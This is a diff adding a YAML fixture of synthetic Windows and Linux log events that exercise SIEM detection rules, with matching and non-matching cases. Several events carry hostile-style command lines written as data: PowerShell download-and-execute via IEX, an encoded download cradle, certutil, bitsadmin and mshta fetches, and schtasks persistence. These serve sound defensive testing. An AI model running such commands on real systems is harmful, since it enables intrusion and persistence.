@@ -1,0 +1,304 @@
+# Synthetic events for every rule, in the shape OpenSearch stores them. Sigma rules list single documents.
+# Custom rules list scenarios: each is a list of documents, judged as a whole.
+# test_live_parity.py runs the Sigma documents on real OpenSearch too.
+
+ps_suspicious_script:
+  match:
+    - {event: {dataset: windows.powershell, code: '4104'}, winlog: {event_data: {ScriptBlockText: "$c = New-Object Net.WebClient; IEX ($c.DownloadString('http://127.0.0.1/a'))"}}}
+    - {event: {dataset: windows.powershell, code: '4104'}, winlog: {event_data: {ScriptBlockText: "invoke-webrequest http://x | iex"}}}
+    - {event: {dataset: windows.powershell, code: '4104'}, winlog: {event_data: {ScriptBlockText: "invoke-expression ([Text.Encoding]::UTF8.GetString([Convert]::FROMBASE64STRING($x)))"}}}
+  no_match:
+    - {event: {dataset: windows.powershell, code: '4104'}, winlog: {event_data: {ScriptBlockText: "Invoke-WebRequest http://x -OutFile y"}}}
+    - {event: {dataset: windows.powershell, code: '4104'}, winlog: {event_data: {ScriptBlockText: "Invoke-Expression 'Get-Date'"}}}
+    - {event: {dataset: windows.powershell, code: '4100'}, winlog: {event_data: {ScriptBlockText: "IEX ($c.DownloadString('x'))"}}}
+    - {event: {dataset: windows.sysmon, code: '1'}, winlog: {event_data: {ScriptBlockText: "IEX ($c.DownloadString('x'))"}}}
+
+proc_encoded_powershell:
+  match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -NoP -enc UwBlAHQA'}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\POWERSHELL.EXE', command_line: 'powershell -EncodedCommand UwBlAHQA'}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\tmp\renamed.exe', pe: {original_file_name: PowerShell.EXE}, command_line: 'renamed -e UwBlAHQA'}}
+  no_match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -ExecutionPolicy Bypass -File a.ps1'}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\cmd.exe', command_line: 'cmd.exe /c tool -enc value'}}
+    - {event: {dataset: windows.sysmon, code: '3'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -enc UwBlAHQA'}}
+
+proc_suspicious_parent_child:
+  match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\cmd.exe', parent: {executable: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'}}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', parent: {executable: 'C:\Windows\System32\cscript.exe'}}}
+  no_match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\cmd.exe', parent: {executable: 'C:\Windows\explorer.exe'}}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\notepad.exe', parent: {executable: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'}}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\cmd.exe', parent: {executable: 'C:\tmp\notwinword.exe.bak'}}}
+
+proc_lolbin_download:
+  match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\certutil.exe', command_line: 'certutil -URLCACHE -f http://x a'}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\bitsadmin.exe', command_line: 'bitsadmin /transfer j http://x y'}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\mshta.exe', command_line: 'mshta https://x/a.hta'}}
+  no_match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\certutil.exe', command_line: 'certutil -hashfile a SHA256'}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\curl.exe', command_line: 'curl urlcache'}}
+
+sec_admin_group_add:
+  match:
+    - {event: {dataset: windows.security, code: '4732'}, winlog: {event_data: {TargetSid: S-1-5-32-544}}}
+    - {event: {dataset: windows.security, code: '4732'}, winlog: {event_data: {TargetSid: S-1-5-32-555}}}
+  no_match:
+    - {event: {dataset: windows.security, code: '4732'}, winlog: {event_data: {TargetSid: S-1-5-32-545}}}
+    - {event: {dataset: windows.security, code: '4733'}, winlog: {event_data: {TargetSid: S-1-5-32-544}}}
+
+proc_uac_bypass_parent:
+  match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\cmd.exe', parent: {executable: 'C:\Windows\System32\fodhelper.exe'}}}
+  no_match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\notepad.exe', parent: {executable: 'C:\Windows\System32\fodhelper.exe'}}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\cmd.exe', parent: {executable: 'C:\Windows\System32\svchost.exe'}}}
+
+proc_privilege_discovery:
+  match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\whoami.exe', command_line: 'whoami /PRIV'}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\whoami.exe', command_line: 'whoami /groups'}}
+  no_match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\whoami.exe', command_line: 'whoami'}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\cmd.exe', command_line: 'cmd /all'}}
+
+sys_new_service:
+  match:
+    - {event: {dataset: windows.system, code: '7045'}, service: {name: Test}, file: {path: 'C:\Program Files\a.exe'}}
+  no_match:
+    - {event: {dataset: windows.system, code: '7040'}, service: {name: Test}}
+    - {event: {dataset: windows.security, code: '7045'}}
+
+sys_service_shell_path:
+  match:
+    - {event: {dataset: windows.system, code: '7045'}, file: {path: 'C:\Windows\System32\CMD.EXE /c exit'}}
+    - {event: {dataset: windows.system, code: '7045'}, file: {path: 'C:\Users\a\AppData\Local\x.exe'}}
+  no_match:
+    - {event: {dataset: windows.system, code: '7045'}, file: {path: 'C:\Program Files\Vendor\agent.exe'}}
+    - {event: {dataset: windows.system, code: '7040'}, file: {path: 'C:\Windows\System32\cmd.exe'}}
+
+task_registered:
+  match:
+    - {event: {dataset: windows.taskscheduler, code: '106'}, file: {path: '\Test'}}
+  no_match:
+    - {event: {dataset: windows.taskscheduler, code: '140'}, file: {path: '\Test'}}
+    - {event: {dataset: windows.taskscheduler, code: '141'}, file: {path: '\Test'}}
+
+proc_schtasks_create:
+  match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\schtasks.exe', command_line: 'schtasks /CREATE /tn a /tr "cmd /c x" /sc once'}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\schtasks.exe', command_line: 'schtasks /create /tn a /tr C:\Users\Public\x.exe /sc once'}}
+  no_match:
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\schtasks.exe', command_line: 'schtasks /query /tn cmd'}}
+    - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\schtasks.exe', command_line: 'schtasks /create /tn a /tr C:\Program\b.exe /sc once'}}
+
+reg_run_key:
+  match:
+    - {event: {dataset: windows.sysmon, code: '13'}, registry: {key: 'HKU\S-1-5-21\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Test'}}
+    - {event: {dataset: windows.sysmon, code: '13'}, registry: {key: 'HKLM\software\microsoft\windows\currentversion\runonce\Test'}}
+  no_match:
+    - {event: {dataset: windows.sysmon, code: '13'}, registry: {key: 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Test'}}
+    - {event: {dataset: windows.sysmon, code: '12'}, registry: {key: 'HKU\S-1-5-21\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Test'}}
+
+file_startup_folder:
+  match:
+    - {event: {dataset: windows.sysmon, code: '11'}, file: {path: 'C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk'}}
+    - {event: {dataset: windows.sysmon, code: '11'}, file: {path: 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\X.BAT'}}
+  no_match:
+    - {event: {dataset: windows.sysmon, code: '11'}, file: {path: 'C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\notes.txt'}}
+    - {event: {dataset: windows.sysmon, code: '11'}, file: {path: 'C:\Users\a\Desktop\x.lnk'}}
+
+defender_detection:
+  match:
+    - {event: {dataset: windows.defender, code: '1116'}, threat: {indicator: {name: 'Test:Sample'}}}
+    - {event: {dataset: windows.defender, code: '1117'}}
+  no_match:
+    - {event: {dataset: windows.defender, code: '5007'}}
+    - {event: {dataset: windows.system, code: '1116'}}
+
+defender_failed_or_disabled:
+  match:
+    - {event: {dataset: windows.defender, code: '5001'}}
+    - {event: {dataset: windows.defender, code: '1119'}}
+  no_match:
+    - {event: {dataset: windows.defender, code: '1116'}}
+    - {event: {dataset: windows.defender, code: '5007'}}
+
+net_script_host_outbound:
+  match:
+    - {event: {dataset: windows.sysmon, code: '3'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'}, destination: {ip: 93.184.216.34, port: 443}}
+    - {event: {dataset: windows.sysmon, code: '3'}, process: {executable: 'C:\Windows\System32\mshta.exe'}, destination: {ip: 8.8.8.8, port: 80}}
+  no_match:
+    - {event: {dataset: windows.sysmon, code: '3'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'}, destination: {ip: 192.168.1.5, port: 443}}
+    - {event: {dataset: windows.sysmon, code: '3'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'}, destination: {ip: 127.0.0.1, port: 9092}}
+    - {event: {dataset: windows.sysmon, code: '3'}, process: {executable: 'C:\Program Files\Browser\browser.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+
+net_uncommon_port:
+  match:
+    - {event: {dataset: windows.sysmon, code: '3'}, process: {executable: 'C:\x.exe'}, destination: {ip: 8.8.8.8, port: 4444}}
+  no_match:
+    - {event: {dataset: windows.sysmon, code: '3'}, process: {executable: 'C:\x.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+    - {event: {dataset: windows.sysmon, code: '22'}, process: {executable: 'C:\x.exe'}, destination: {ip: 8.8.8.8, port: 4444}}
+
+failed_logon_burst:
+  match:
+    -
+      - &fail1 {'@timestamp': '2026-10-31T10:00:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:00:30.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: BOB}}
+      - {'@timestamp': '2026-10-31T10:01:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:02:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:04:59.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+  no_match:
+    -
+      - *fail1
+      - {'@timestamp': '2026-10-31T10:01:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:02:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:03:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+    -
+      - *fail1
+      - {'@timestamp': '2026-10-31T10:01:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:02:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:03:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:05:01.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+
+password_spray:
+  match:
+    -
+      - {'@timestamp': '2026-10-31T10:00:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: a}}
+      - {'@timestamp': '2026-10-31T10:01:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: b}}
+      - {'@timestamp': '2026-10-31T10:02:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: c}}
+      - {'@timestamp': '2026-10-31T10:03:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: d}}
+  no_match:
+    -
+      - {'@timestamp': '2026-10-31T10:00:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: a}}
+      - {'@timestamp': '2026-10-31T10:01:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: a}}
+      - {'@timestamp': '2026-10-31T10:02:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: b}}
+      - {'@timestamp': '2026-10-31T10:03:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: c}}
+
+logon_after_failures:
+  match:
+    -
+      - {'@timestamp': '2026-10-31T10:00:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:01:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:02:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:03:00.000Z', event: {dataset: windows.security, code: '4624'}, host: {name: H}, user: {name: bob}, winlog: {event_data: {LogonType: '3'}}}
+  no_match:
+    -
+      - {'@timestamp': '2026-10-31T10:00:00.000Z', event: {dataset: windows.security, code: '4624'}, host: {name: H}, user: {name: bob}, winlog: {event_data: {LogonType: '3'}}}
+      - {'@timestamp': '2026-10-31T10:01:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:02:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:03:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+    -
+      - {'@timestamp': '2026-10-31T10:00:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:01:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:02:00.000Z', event: {dataset: windows.security, code: '4625'}, host: {name: H}, user: {name: bob}}
+      - {'@timestamp': '2026-10-31T10:03:00.000Z', event: {dataset: windows.security, code: '4624'}, host: {name: H}, user: {name: bob}, winlog: {event_data: {LogonType: '5'}}}
+
+encoded_command_content:
+  match:
+    -
+      - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwB4ACcAKQA='}}
+  no_match:
+    -
+      - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -enc RwBlAHQALQBEAGEAdABlAA=='}}
+    -
+      - {event: {dataset: windows.sysmon, code: '1'}, process: {executable: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -enc not-valid-base64-text!!!!'}}
+
+network_beacon:
+  match:
+    -
+      - {'@timestamp': '2026-10-31T10:00:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+      - {'@timestamp': '2026-10-31T10:01:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+      - {'@timestamp': '2026-10-31T10:02:01.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+      - {'@timestamp': '2026-10-31T10:03:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+      - {'@timestamp': '2026-10-31T10:04:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+      - {'@timestamp': '2026-10-31T10:05:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+  no_match:
+    -
+      - {'@timestamp': '2026-10-31T10:00:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+      - {'@timestamp': '2026-10-31T10:00:20.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+      - {'@timestamp': '2026-10-31T10:03:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+      - {'@timestamp': '2026-10-31T10:03:30.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+      - {'@timestamp': '2026-10-31T10:09:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+      - {'@timestamp': '2026-10-31T10:09:10.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 8.8.8.8, port: 443}}
+    -
+      - {'@timestamp': '2026-10-31T10:00:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 192.168.1.1, port: 443}}
+      - {'@timestamp': '2026-10-31T10:01:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 192.168.1.1, port: 443}}
+      - {'@timestamp': '2026-10-31T10:02:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 192.168.1.1, port: 443}}
+      - {'@timestamp': '2026-10-31T10:03:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 192.168.1.1, port: 443}}
+      - {'@timestamp': '2026-10-31T10:04:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 192.168.1.1, port: 443}}
+      - {'@timestamp': '2026-10-31T10:05:00.000Z', event: {dataset: windows.sysmon, code: '3'}, network: {direction: egress}, host: {name: H}, process: {executable: 'C:\a.exe'}, destination: {ip: 192.168.1.1, port: 443}}
+
+# Linux host. Normalization gives event.action only when journald confirms the program.
+auth_sudo_failed:
+  match:
+    - {event: {dataset: linux.auth, action: sudo-auth-failed}, user: {name: alice}}
+    - {event: {dataset: linux.auth, action: sudo-not-permitted}, user: {name: bob}}
+  no_match:
+    - {event: {dataset: linux.auth, action: sudo-command}, user: {name: alice}}
+    - {event: {dataset: linux.system, action: sudo-auth-failed}}
+    - {event: {dataset: linux.auth, action: unverified-log-entry}, labels: {attribution: unverified}}
+
+auth_sudo_command:
+  match:
+    - {event: {dataset: linux.auth, action: sudo-command}, user: {name: alice}}
+  no_match:
+    - {event: {dataset: linux.auth, action: sudo-auth-failed}}
+    - {event: {dataset: linux.auth, action: unverified-log-entry}}
+
+auth_user_created:
+  match:
+    - {event: {dataset: linux.auth, action: user-created}, user: {target: {name: mallory}}}
+  no_match:
+    - {event: {dataset: linux.auth, action: user-deleted}}
+    - {event: {dataset: linux.auth, action: unverified-log-entry}}
+    - {event: {dataset: windows.security, action: user-created}}
+
+auth_privileged_group:
+  match:
+    - {event: {dataset: linux.auth, action: group-member-added}, group: {name: sudo}}
+    - {event: {dataset: linux.auth, action: group-member-added}, group: {name: siem-asset-admin}}
+  no_match:
+    - {event: {dataset: linux.auth, action: group-member-added}, group: {name: users}}
+    - {event: {dataset: linux.auth, action: group-member-removed}, group: {name: sudo}}
+    - {event: {dataset: linux.auth, action: unverified-log-entry}, group: {name: sudo}}
+
+cron_crontab_changed:
+  match:
+    - {event: {dataset: linux.cron, action: crontab-replaced}}
+    - {event: {dataset: linux.cron, action: crontab-deleted}}
+  no_match:
+    - {event: {dataset: linux.cron, action: crontab-listed}}
+    - {event: {dataset: linux.cron, action: scheduled-task-run}}
+
+system_siem_service_failed:
+  match:
+    - {event: {dataset: linux.system, action: service-failed}, service: {name: vector}}
+    - {event: {dataset: linux.system, action: service-failed}, service: {name: siem-detector}}
+  no_match:
+    - {event: {dataset: linux.system, action: service-stopped}, service: {name: vector}}
+    - {event: {dataset: linux.system, action: service-failed}, service: {name: snapd}}
+    - {event: {dataset: linux.system, action: unverified-log-entry}, service: {name: vector}}
+
+package_installed:
+  match:
+    - {event: {dataset: linux.package, action: package-installed}, package: {name: 'sl:amd64'}}
+  no_match:
+    - {event: {dataset: linux.package, action: package-upgraded}, package: {name: 'curl:amd64'}}
+    - {event: {dataset: linux.package, action: package-removed}}
+
+linux_auth_burst:
+  match:
+    - - {'@timestamp': '2026-11-01T10:00:00.000Z', event: {id: a1, dataset: linux.auth, action: pam-auth-failed}, host: {name: h-wsl}, user: {name: alice, target: {name: alice}}}
+      - {'@timestamp': '2026-11-01T10:00:30.000Z', event: {id: a2, dataset: linux.auth, action: pam-auth-failed}, host: {name: h-wsl}, user: {name: alice, target: {name: alice}}}
+      - {'@timestamp': '2026-11-01T10:01:00.000Z', event: {id: a3, dataset: linux.auth, action: ssh-login-failed}, host: {name: h-wsl}, user: {name: alice}}
+      - {'@timestamp': '2026-11-01T10:01:30.000Z', event: {id: a4, dataset: linux.auth, action: su-failed}, host: {name: h-wsl}, user: {name: alice}}
+      - {'@timestamp': '2026-11-01T10:02:00.000Z', event: {id: a5, dataset: linux.auth, action: pam-auth-failed}, host: {name: h-wsl}, user: {name: alice, target: {name: alice}}}
+  no_match:
+    - - {'@timestamp': '2026-11-01T10:00:00.000Z', event: {id: b1, dataset: linux.auth, action: pam-auth-failed}, host: {name: h-wsl}, user: {name: alice}}
+      - {'@timestamp': '2026-11-01T10:00:30.000Z', event: {id: b2, dataset: linux.auth, action: pam-auth-failed}, host: {name: h-wsl}, user: {name: alice}}
+      - {'@timestamp': '2026-11-01T10:01:00.000Z', event: {id: b3, dataset: linux.auth, action: pam-auth-failed}, host: {name: h-wsl}, user: {name: bob}}
+      - {'@timestamp': '2026-11-01T10:01:30.000Z', event: {id: b4, dataset: linux.auth, action: pam-auth-failed}, host: {name: h-wsl}, user: {name: bob}}
+      - {'@timestamp': '2026-11-01T10:20:00.000Z', event: {id: b5, dataset: linux.auth, action: pam-auth-failed}, host: {name: h-wsl}, user: {name: alice}}
